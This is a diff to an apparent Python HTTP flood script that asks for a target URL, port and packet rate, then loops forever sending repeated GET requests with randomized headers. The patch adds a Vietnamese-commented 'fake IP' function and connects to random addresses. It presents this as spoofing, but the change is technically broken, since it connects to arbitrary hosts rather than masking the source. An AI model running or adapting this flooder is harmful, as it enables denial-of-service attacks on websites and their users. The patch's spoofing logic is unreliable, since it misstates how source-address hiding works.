@@ -57,6 +57,10 @@ acceptall = [
     "Accept-Language: en-US,en;q=0.5\r\n"
 ]
 
+def fake_ip():
+    """Tạo một IP giả ngẫu nhiên"""
+    return ".".join(str(random.randint(0, 255)) for _ in range(4))
+
 url = input('[+] Target URL: ')
 port = int(input('[+] Port: '))
 pack = int(input('[+] Packet/s: '))
@@ -69,17 +73,19 @@ def start():
     global useragents, ref, acceptall
     hh = random._urandom(3016)
     xx = 0
-    useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
-    accept = random.choice(acceptall)
-    reffer = "Referer: "+random.choice(ref)+parsed_url.hostname + "\r\n"
-    content = "Content-Type: application/x-www-form-urlencoded\r\n"
-    length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
-    target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(ip, port)
-    main_req = target_host + useragen + accept + reffer + content + length + "\r\n"
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((ip, port))
+            # Sử dụng IP giả cho kết nối
+            fake_ip_address = fake_ip()
+            s.connect((fake_ip_address, port))
+            useragen = "User-Agent: " + random.choice(useragents) + "\r\n"
+            accept = random.choice(acceptall)
+            reffer = "Referer: " + random.choice(ref) + parsed_url.hostname + "\r\n"
+            content = "Content-Type: application/x-www-form-urlencoded\r\n"
+            length = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
+            target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(ip, port)
+            main_req = target_host + useragen + accept + reffer + content + length + "\r\n"
             s.send(str.encode(main_req))
             for i in range(pack):
                 s.send(str.encode(main_req))
